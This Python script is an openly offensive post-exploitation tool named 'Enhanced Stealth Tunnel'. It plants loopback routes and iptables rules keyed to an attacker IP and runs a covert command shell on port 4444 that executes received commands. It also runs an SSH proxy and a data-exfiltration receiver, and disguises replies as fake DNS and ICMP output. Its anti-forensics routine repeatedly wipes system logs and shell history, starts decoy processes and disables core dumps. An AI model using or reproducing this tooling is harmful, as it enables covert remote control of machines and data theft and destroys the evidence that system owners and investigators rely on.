#!/usr/bin/env python3
"""
Enhanced Stealth Tunnel with Cryptography and Disguise
Support for multiple data hiding protocols
"""

import subprocess
import socket
import threading
import json
import argparse
import signal
import sys
import time
import random
import base64
from crypto_tunnel import CryptoManager, TrafficObfuscator
from scapy.all import *

class EnhancedStealthTunnel:
    def __init__(self, config_file=None):
        self.config = self.load_config(config_file)
        self.running = False
        self.tunnels = []
        
        self.crypto = CryptoManager(
            master_password=self.config.get('master_password'),
            key_file=self.config.get('key_file', 'tunnel.key')
        )
        
        self.obfuscator = TrafficObfuscator()
        
        self.steganography_protocols = self.config.get('steganography', ['http', 'dns'])
        
    def load_config(self, config_file):
        """Loading the extended configuration"""
        default_config = {
            "blackhole_network": "198.51.100.0/24",
            "tunnel_ips": ["198.51.100.10", "198.51.100.20", "198.51.100.30"],
            "attacker_ip": "192.168.1.100",
            "services": [
                {
                    "name": "encrypted_ssh", 
                    "port": 22, 
                    "tunnel_ip": "198.51.100.10", 
                    "tunnel_port": 22,
                    "encryption": "aes256",
                    "steganography": "http"
                },
                {
                    "name": "covert_shell", 
                    "tunnel_ip": "198.51.100.20", 
                    "tunnel_port": 4444,
                    "encryption": "chacha20",
                    "steganography": "dns"
                },
                {
                    "name": "data_exfil", 
                    "tunnel_ip": "198.51.100.30", 
                    "tunnel_port": 8080,
                    "encryption": "aes256",
                    "steganography": "icmp"
                }
            ],
            "master_password": None,
            "key_file": "tunnel.key",
            "noise_traffic": True,
            "noise_duration": 3600,
            "log_prefix": "stealth-tunnel",
            "steganography": ["http", "dns"],
            "anti_forensics": {
                "clear_logs": True,
                "fake_processes": True,
                "memory_encryption": True
            }
        }
        
        if config_file:
            try:
                with open(config_file, 'r') as f:
                    user_config = json.load(f)
                    default_config.update(user_config)
            except Exception as e:
                print(f"[!] Configuration loading error: {e}")
                
        return default_config
    
    def setup_advanced_routes(self):
        """Advanced multi-path routing setup"""
        print("[+] Configuring advanced routing...")
        
        for i, tunnel_ip in enumerate(self.config['tunnel_ips']):
            
            cmd = f"ip addr add {tunnel_ip}/32 dev lo"
            self.run_cmd(cmd)
            
            
            cmd = f"ip route add {tunnel_ip}/32 dev lo metric {100 + i}"
            self.run_cmd(cmd)
            
       
        cmd = f"ip route add {self.config['blackhole_network']} dev lo"
        self.run_cmd(cmd)
        
    def setup_advanced_iptables(self):
        """Advanced iptables rules with QoS and masking"""
        print("[+] Configuring advanced iptables rules...")
        
        self.run_cmd("iptables -t mangle -N STEALTH_TUNNEL")
        self.run_cmd("iptables -t nat -N STEALTH_NAT")
        
        cmd = f"iptables -t mangle -A PREROUTING -s {self.config['attacker_ip']} -d {self.config['blackhole_network']} -j MARK --set-mark 0x1337"
        self.run_cmd(cmd)
        
        cmd = f"iptables -A INPUT -m mark --mark 0x1337 -j LOG --log-prefix '{self.config['log_prefix']}: ' --log-level 6"
        self.run_cmd(cmd)
        
        for service in self.config['services']:
            cmd = f"iptables -t nat -A STEALTH_NAT -d {service['tunnel_ip']} -p tcp --dport {service['tunnel_port']} -j DNAT --to-destination 127.0.0.1:{service.get('port', service['tunnel_port'])}"
            self.run_cmd(cmd)
            
        self.run_cmd("iptables -t nat -A OUTPUT -j STEALTH_NAT")
        
        self.run_cmd("iptables -A INPUT -m mark --mark 0x1337 -j ACCEPT")
        
    def start_encrypted_service(self, service):
        """Launching an encrypted service"""
        print(f"[+] Launching an encrypted service {service['name']}...")
        
        def encrypted_service():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind((service['tunnel_ip'], service['tunnel_port']))
                server.listen(5)
                
                print(f"[+] {service['name']} listen {service['tunnel_ip']}:{service['tunnel_port']}")
                
                while self.running:
                    try:
                        client, addr = server.accept()
                        print(f"[+] Encrypted connection from {addr} to {service['name']}")
                        
                        thread = threading.Thread(
                            target=self.handle_encrypted_client,
                            args=(client, service)
                        )
                        thread.daemon = True
                        thread.start()
                        
                    except Exception as e:
                        if self.running:
                            print(f"[!] Service error {service['name']}: {e}")
                            
            except Exception as e:
                print(f"[!] Service Critical error {service['name']}: {e}")
                
        thread = threading.Thread(target=encrypted_service)
        thread.daemon = True
        thread.start()
        self.tunnels.append(thread)
        
    def handle_encrypted_client(self, client, service):
        """Processing an encrypted client"""
        try:
  
            encrypted_data = client.recv(4096)
            
            if service.get('steganography'):
                if service['steganography'] == 'http':
                    decrypted_data = self.crypto.extract_from_http(encrypted_data)
                else:
                    decrypted_data = encrypted_data
            else:
                decrypted_data = encrypted_data
                
            if not decrypted_data:
                return
                
            if service['encryption'] == 'aes256':
                plaintext = self.crypto.decrypt_aes(decrypted_data)
            elif service['encryption'] == 'chacha20':
                plaintext = self.crypto.decrypt_chacha20(decrypted_data)
            else:
                plaintext = decrypted_data
                
            if service['name'] == 'encrypted_ssh':
                self.handle_ssh_proxy(client, service, plaintext)
            elif service['name'] == 'covert_shell':
                self.handle_covert_shell(client, service, plaintext)
            elif service['name'] == 'data_exfil':
                self.handle_data_exfiltration(client, service, plaintext)
                
        except Exception as e:
            print(f"[!] Client processing error: {e}")
        finally:
            client.close()
            
    def handle_ssh_proxy(self, client, service, data):
        """SSH proxying with encryption"""
        try:
            
            ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssh_sock.connect(('127.0.0.1', 22))
            
            ssh_sock.send(data)
            
            response = ssh_sock.recv(4096)
            
            if service['encryption'] == 'aes256':
                encrypted_response = self.crypto.encrypt_aes(response)
            else:
                encrypted_response = self.crypto.encrypt_chacha20(response)
                
            if service.get('steganography') == 'http':
                steganographic_response = self.crypto.create_steganographic_packet(
                    encrypted_response, 'http'
                )
            else:
                steganographic_response = encrypted_response
                
            client.send(steganographic_response)
            ssh_sock.close()
            
        except Exception as e:
            print(f"[!] SSH proxy error: {e}")
            
    def handle_covert_shell(self, client, service, command):
        """Скрытая командная оболочка"""
        try:
            
            result = subprocess.check_output(
                command.decode(), 
                shell=True, 
                stderr=subprocess.STDOUT
            )
            
           
            if service['encryption'] == 'chacha20':
                encrypted_result = self.crypto.encrypt_chacha20(result)
            else:
                encrypted_result = self.crypto.encrypt_aes(result)
                
            
            if service.get('steganography') == 'dns':
                
                dns_response = self.create_fake_dns_response(encrypted_result)
                client.send(dns_response)
            else:
                client.send(encrypted_result)
                
        except subprocess.CalledProcessError as e:
            error_msg = f"Command error: {e.output}"
            encrypted_error = self.crypto.encrypt_chacha20(error_msg.encode())
            client.send(encrypted_error)
            
    def create_fake_dns_response(self, data):
        """Creating a fake DNS response"""
        
        encoded = base64.b64encode(data).decode()
        
        fake_response = f"""
;; ANSWER SECTION:
{encoded[:32]}.example.com. 300 IN A 192.0.2.1
{encoded[32:64]}.example.com. 300 IN A 192.0.2.2
        """.strip()
        
        return fake_response.encode()
        
    def handle_data_exfiltration(self, client, service, data):
        """Data exfiltration processing"""
        try:
            
            timestamp = int(time.time())
            filename = f"/tmp/exfil_{timestamp}.dat"
            
            with open(filename, 'wb') as f:
                f.write(data)
                
            print(f"[+] The data is saved in {filename}")
            
            confirmation = f"Data received: {len(data)} bytes saved to {filename}"
            encrypted_conf = self.crypto.encrypt_aes(confirmation.encode())
            
            icmp_response = self.create_fake_icmp_response(encrypted_conf)
            client.send(icmp_response)
            
        except Exception as e:
            print(f"[!] Exfiltration error: {e}")
            
    def create_fake_icmp_response(self, data):
        """Creating a fake ICMP response"""
        encoded = base64.b64encode(data).decode()
        
        fake_icmp = f"""
PING statistics for fake host:
    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss)
    Data: {encoded}
        """.strip()
        
        return fake_icmp.encode()
        
    def start_anti_forensics(self):
        """Launching anti-investigative measures"""
        if not self.config.get('anti_forensics', {}).get('enabled', False):
            return
            
        print("[+] Activation of anti-investigative measures...")
        
        if self.config['anti_forensics'].get('clear_logs'):
            threading.Thread(target=self.clear_logs_periodically, daemon=True).start()
            
        if self.config['anti_forensics'].get('fake_processes'):
            threading.Thread(target=self.create_fake_processes, daemon=True).start()
            
        if self.config['anti_forensics'].get('memory_encryption'):
            self.enable_memory_protection()
            
    def clear_logs_periodically(self):
        """Periodic cleaning of logs"""
        while self.running:
            try:
            
                self.run_cmd("echo '' > /var/log/auth.log")
                self.run_cmd("echo '' > /var/log/syslog")
                self.run_cmd("journalctl --vacuum-time=1s")
                self.run_cmd("history -c")
                self.run_cmd("echo '' > ~/.bash_history")
                
                time.sleep(300)
                
            except Exception as e:
                print(f"[!] Error clearing logs: {e}")
                
    def create_fake_processes(self):
        """Creating fake processes to disguise"""
        fake_processes = [
            "python3 -c 'import time; time.sleep(3600)' # system_update",
            "bash -c 'while true; do sleep 60; done' # log_rotate",
            "python3 -c 'import time; time.sleep(7200)' # backup_service"
        ]
        
        for fake_cmd in fake_processes:
            try:
                subprocess.Popen(fake_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[+] A fake process has been started")
            except:
                pass
                
    def enable_memory_protection(self):
        """Enabling memory protection"""
        try:
            
            self.run_cmd("echo 'kernel.core_pattern = /dev/null' >> /etc/sysctl.conf")
            self.run_cmd("sysctl -p")
            
            self.run_cmd("echo 2 > /proc/sys/kernel/randomize_va_space")
            
            print("[+] Memory protection is activated")
        except:
            pass
            
    def start(self):
        """Launching an advanced tunnel"""
        print("[+] Launch of the Enhanced Stealth Tunnel...")
        self.running = True
        
        try:
           
            self.setup_advanced_routes()
            self.setup_advanced_iptables()
            
            for service in self.config['services']:
                self.start_encrypted_service(service)
                
            self.start_anti_forensics()
            
            if self.config.get('noise_traffic'):
                self.obfuscator.add_noise_traffic(
                    self.config['attacker_ip'],
                    self.config.get('noise_duration', 3600)
                )
                
            print("[+] Enhanced Stealth Tunnel is ACTIVE!")
            print(f"[+] The keys are saved in: {self.crypto.key_file}")
            print(f"[+] Master password: {self.crypto.master_password}")
            
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[+] A stop signal has been received...")
        finally:
            self.running = False
            self.cleanup()
            
    def cleanup(self):
        """Advanced cleaning"""
        print("\n[+] Cleaning Enhanced Stealth Tunnel...")
        
        for tunnel_ip in self.config['tunnel_ips']:
            self.run_cmd(f"ip addr del {tunnel_ip}/32 dev lo")
            self.run_cmd(f"ip route del {tunnel_ip}/32 dev lo")
            
        self.run_cmd(f"ip route del {self.config['blackhole_network']} dev lo")
        self.run_cmd("iptables -t mangle -F STEALTH_TUNNEL")
        self.run_cmd("iptables -t mangle -X STEALTH_TUNNEL")
        self.run_cmd("iptables -t nat -F STEALTH_NAT")
        self.run_cmd("iptables -t nat -X STEALTH_NAT")
        self.run_cmd(f"iptables -t mangle -D PREROUTING -s {self.config['attacker_ip']} -d {self.config['blackhole_network']} -j MARK --set-mark 0x1337")
        self.run_cmd("iptables -D INPUT -m mark --mark 0x1337 -j ACCEPT")
        
        if hasattr(self, 'crypto'):
            del self.crypto
            
        print("[+] Cleaning is COMPLETE!")
        
    def run_cmd(self, cmd):
        """Executing a command with logging"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode != 0 and "File exists" not in result.stderr:
                print(f"[!] Command: {cmd}")
                print(f"[!] Stderr: {result.stderr}")
            else:
                print(f"[+] OK: {cmd}")
        except Exception as e:
            print(f"[!] Exception: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Enhanced Stealth Tunnel v.1.0')
    parser.add_argument('-c', '--config', help='Configuration file')
    parser.add_argument('--generate-config', action='store_true', help='Config generation')
    parser.add_argument('--generate-keys', action='store_true', help='Generating keys only')
    
    args = parser.parse_args()
    
    if args.generate_config:
        
        config = {
            "blackhole_network": "198.51.100.0/24",
            "tunnel_ips": ["198.51.100.10", "198.51.100.20", "198.51.100.30"],
            "attacker_ip": "YOUR_ATTACKER_IP_HERE",
            "services": [
                {
                    "name": "encrypted_ssh", 
                    "port": 22, 
                    "tunnel_ip": "198.51.100.10", 
                    "tunnel_port": 22,
                    "encryption": "aes256",
                    "steganography": "http"
                },
                {
                    "name": "covert_shell", 
                    "tunnel_ip": "198.51.100.20", 
                    "tunnel_port": 4444,
                    "encryption": "chacha20",
                    "steganography": "dns"
                }
            ],
            "noise_traffic": True,
            "noise_duration": 3600,
            "anti_forensics": {
                "enabled": True,
                "clear_logs": True,
                "fake_processes": True,
                "memory_encryption": True
            },
            "steganography": ["http", "dns", "icmp"]
        }
        
        with open('enhanced_tunnel_config.json', 'w') as f:
            json.dump(config, f, indent=2)
        print("[+] The extended configuration is saved.")
        
    elif args.generate_keys:
        crypto = CryptoManager()
        print(f"[+] Master password: {crypto.master_password}")
        
    else:
        tunnel = EnhancedStealthTunnel(args.config)
        tunnel.start()